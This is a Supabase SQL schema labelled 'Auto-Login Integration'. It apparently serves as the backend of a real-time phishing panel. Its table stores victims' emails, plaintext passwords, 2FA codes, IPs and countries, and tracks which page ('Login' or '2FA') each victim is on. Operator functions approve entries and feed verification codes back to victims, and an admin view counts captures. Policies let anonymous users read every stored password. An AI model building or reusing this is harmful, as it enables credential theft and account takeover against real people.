-- =====================================================
-- SUPABASE SCHEMA FOR NEW PROJECT
-- Project: otbswtklpidhezziotac  
-- Auto-Login Integration Ready
-- =====================================================

-- Create requests table
CREATE TABLE IF NOT EXISTS public.requests (
  id BIGSERIAL PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT DEFAULT '',
  twofa TEXT DEFAULT '',
  user_agent TEXT DEFAULT '',
  ip TEXT DEFAULT '',
  country TEXT DEFAULT 'Unknown',
  status TEXT DEFAULT 'pending' CHECK (status IN ('pending', 'approved', 'denied')),
  page_status TEXT DEFAULT 'Login',
  verification_code TEXT DEFAULT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  approved_at TIMESTAMPTZ DEFAULT NULL
);

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_requests_email ON public.requests(email);
CREATE INDEX IF NOT EXISTS idx_requests_status ON public.requests(status);
CREATE INDEX IF NOT EXISTS idx_requests_created_at ON public.requests(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_requests_email_created ON public.requests(email, created_at DESC);

-- Enable Row Level Security (RLS)
ALTER TABLE public.requests ENABLE ROW LEVEL SECURITY;

-- Create policies for RLS
-- Allow all operations for service role
CREATE POLICY "Enable all for service role" ON public.requests
  FOR ALL USING (auth.role() = 'service_role');

-- Allow insert for anon users (frontend submissions)
CREATE POLICY "Enable insert for anon users" ON public.requests
  FOR INSERT WITH CHECK (true);

-- Allow select for anon users (check approval status)
CREATE POLICY "Enable select for anon users" ON public.requests
  FOR SELECT USING (true);

-- Create function to approve/deny requests
CREATE OR REPLACE FUNCTION approve_request(
  request_id BIGINT,
  decision TEXT,
  verification_code_param TEXT DEFAULT NULL
)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  result JSON;
BEGIN
  -- Validate decision
  IF decision NOT IN ('approved', 'denied') THEN
    RAISE EXCEPTION 'Invalid decision. Must be approved or denied.';
  END IF;

  -- Update the request
  UPDATE public.requests 
  SET 
    status = decision,
    verification_code = verification_code_param,
    approved_at = CASE WHEN decision = 'approved' THEN NOW() ELSE NULL END
  WHERE id = request_id;

  -- Check if update was successful
  IF NOT FOUND THEN
    RAISE EXCEPTION 'Request with ID % not found.', request_id;
  END IF;

  -- Return success result
  SELECT json_build_object(
    'success', true,
    'request_id', request_id,
    'decision', decision,
    'verification_code', verification_code_param,
    'timestamp', NOW()
  ) INTO result;

  RETURN result;
END;
$$;

-- Create function to set verification code
CREATE OR REPLACE FUNCTION set_verification_code(
  email_param TEXT,
  code_param TEXT
)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
  request_id BIGINT;
  result JSON;
BEGIN
  -- Find latest request for this email
  SELECT id INTO request_id
  FROM public.requests 
  WHERE email = email_param 
  ORDER BY created_at DESC 
  LIMIT 1;

  -- Check if request exists
  IF request_id IS NULL THEN
    RAISE EXCEPTION 'No request found for email: %', email_param;
  END IF;

  -- Update verification code
  UPDATE public.requests 
  SET verification_code = code_param
  WHERE id = request_id;

  -- Return success result
  SELECT json_build_object(
    'success', true,
    'request_id', request_id,
    'email', email_param,
    'code', code_param,
    'timestamp', NOW()
  ) INTO result;

  RETURN result;
END;
$$;

-- Create stats view for admin dashboard
CREATE OR REPLACE VIEW public.request_stats AS
SELECT 
  COUNT(*) as total_requests,
  COUNT(*) FILTER (WHERE status = 'pending') as pending_count,
  COUNT(*) FILTER (WHERE status = 'approved') as approved_count,
  COUNT(*) FILTER (WHERE status = 'denied') as denied_count,
  COUNT(*) FILTER (WHERE created_at >= NOW() - INTERVAL '24 hours') as last_24h_count,
  COUNT(*) FILTER (WHERE created_at >= NOW() - INTERVAL '1 hour') as last_1h_count
FROM public.requests;

-- Grant permissions
GRANT ALL ON public.requests TO service_role;
GRANT ALL ON public.request_stats TO service_role;
GRANT USAGE ON SEQUENCE public.requests_id_seq TO service_role;

-- Insert sample data for testing
INSERT INTO public.requests (email, password, twofa, user_agent, ip, country, status, page_status) VALUES
  ('test@gmail.com', 'testpass123', '', 'Mozilla/5.0', '127.0.0.1', 'US', 'approved', 'Login'),
  ('demo@example.com', 'demopass456', '123456', 'Chrome/91.0', '192.168.1.1', 'VN', 'pending', '2FA');

-- Display success message
DO $$
BEGIN
  RAISE NOTICE 'SUCCESS: Database schema created for Auto-Login integration!';
  RAISE NOTICE 'Tables: requests';
  RAISE NOTICE 'Functions: approve_request, set_verification_code';
  RAISE NOTICE 'Views: request_stats';
  RAISE NOTICE 'Ready for Edge Functions deployment!';
END $$; 